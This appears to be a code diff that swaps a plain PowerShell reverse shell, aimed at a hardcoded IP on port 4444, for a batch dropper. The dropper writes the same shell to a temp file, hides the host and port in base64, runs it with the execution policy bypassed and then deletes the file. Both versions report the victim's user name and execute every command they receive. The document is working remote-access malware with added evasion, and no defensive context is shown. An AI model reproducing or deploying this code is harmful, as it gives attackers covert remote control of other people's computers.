@@ -1,38 +1,41 @@
-try {
-    $client = New-Object System.Net.Sockets.TCPClient('162.19.135.187', 4444)
-    $stream = $client.GetStream()
-    $writer = New-Object System.IO.StreamWriter($stream)
-    $reader = New-Object System.IO.StreamReader($stream)
-
-    # Send current user name
-    $writer.WriteLine([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
-    $writer.Flush()
-
-    while ($true) {
-        $command = $reader.ReadLine()
-
-        if ($command -eq 'exit') {
-            break
-        }
-
-        try {
-            $output = Invoke-Expression $command 2>&1
-
-            # Format output to avoid System.Object[]
-            if ($output -is [System.Collections.IEnumerable] -and -not ($output -is [string])) {
-                $output = $output -join "`n"  # Join array elements with a newline
-            }
-        } catch {
-            $output = "Error executing command: $_"
-        }
-
-        $writer.WriteLine($output)
-        $writer.Flush()
-    }
-} catch {
-    Write-Host "An error occurred: $_"
-} finally {
-    if ($client) {
-        $client.Close()
-    }
-}
+@echo off
+set revsh=%temp%\838e861f-78c6-4d73-8d6f-743bc6beadaf.ps1
+(
+    echo try ^{
+    echo     ^$i = 'NDUuOTMuMTM2LjI4'
+    echo     ^$k = 'NDQ0NA=='
+    echo     ^$j = [System.Text.Encoding]::UTF8.GetString^([Convert]::FromBase64String^(^$i^)^)
+    echo     ^$l = [System.Text.Encoding]::UTF8.GetString^([Convert]::FromBase64String^(^$k^)^)
+    echo     ^$client = New-Object System.Net.Sockets.TCPClient(^$j, ^$l^)
+    echo     ^$stream = ^$client.GetStream^(^)
+    echo     ^$writer = New-Object System.IO.StreamWriter^(^$stream^)
+    echo     ^$reader = New-Object System.IO.StreamReader^(^$stream^)
+    echo     ^$writer.WriteLine^([System.Security.Principal.WindowsIdentity]::GetCurrent^(^).Name^)
+    echo     ^$writer.Flush^(^)
+    echo     while ^(^$true^) ^{
+    echo         ^$command = ^$reader.ReadLine^(^)
+    echo         if ^(^$command -eq 'exit'^) ^{
+    echo             break
+    echo         ^}
+    echo         try ^{
+    echo             ^$output = Invoke-Expression ^$command 2^>^&1
+    echo             if ^(^$output -is [System.Collections.IEnumerable] -and -not ^(^$output -is [string]^)^) ^{
+    echo                 ^$output = ^$output -join ^"``n^"
+    echo             ^}
+    echo         ^} catch ^{
+    echo             ^$output = ^"error: ^$_^"
+    echo         ^}
+    echo         ^$writer.WriteLine^(^$output^)
+    echo         ^$writer.Flush^(^)
+    echo     ^}
+    echo ^} catch ^{
+    echo     Write-Host ^"error: ^$_^"
+    echo ^} finally ^{
+    echo     if ^(^$client^) ^{
+    echo         ^$client.Close^(^)
+    echo     ^}
+    echo ^}
+) > "%revsh%"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%revsh%"
+del "%revsh%"
+pause
